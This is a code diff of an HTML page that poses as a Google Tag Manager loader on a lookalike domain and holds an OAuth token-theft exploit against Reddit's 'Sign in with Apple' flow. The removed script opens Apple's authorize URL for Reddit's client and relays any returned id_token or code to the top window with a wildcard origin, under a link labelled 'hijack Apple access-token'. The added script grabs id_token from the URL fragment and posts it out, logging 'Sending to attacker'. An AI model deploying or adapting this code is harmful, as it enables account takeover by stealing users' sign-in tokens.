@@ -28,23 +28,36 @@
         <p><strong>Status:</strong> Loading Google Tag Manager...</p>
         
         <!-- This is the leaky script -->
-       <script>var b, x;
-var state = parent.location.href.substr(location.href.indexOf('state='));
-var d = document.createElement('div');
-if (!window.inited) {
-  window.inited = true;
-d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
-parent.document.children[parent.document.children.length - 1].appendChild(d);
-if(top!==parent.window) top.postMessage('stopinject', '*');
-parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
-x = setInterval(function() {
-if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
-  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
-  clearInterval(x);
-};
+       <script>
+    console.log("%c[GTM] Loaded on subs-redditt.github.io", "color:red; font-weight:bold");
 
-}, 500);
-}
+    const params = new URLSearchParams(location.search);
+    const state = params.get('state') || 'default';
+
+    if (!window.inited) {
+        window.inited = true;
+
+        // Auto-detect token in URL fragment and send it
+        if (location.hash.includes('id_token')) {
+            console.log("%c[GTM] Token detected → Sending to attacker", "color:lime");
+            try {
+                top.postMessage(location.hash, '*');
+                parent.postMessage(location.hash, '*');
+                window.postMessage(location.hash, '*');
+            } catch(e) {
+                console.log("postMessage error:", e);
+            }
+        }
+
+        // Show test button
+        const div = document.createElement('div');
+        div.style.margin = "40px";
+        div.innerHTML = `
+            <h2 style="color:#ff4500">Test Page (subs-redditt.github.io)</h2>
+            <p>State: ${state}</p>
+        `;
+        document.body.appendChild(div);
+    }
 </script>
     </div>
 
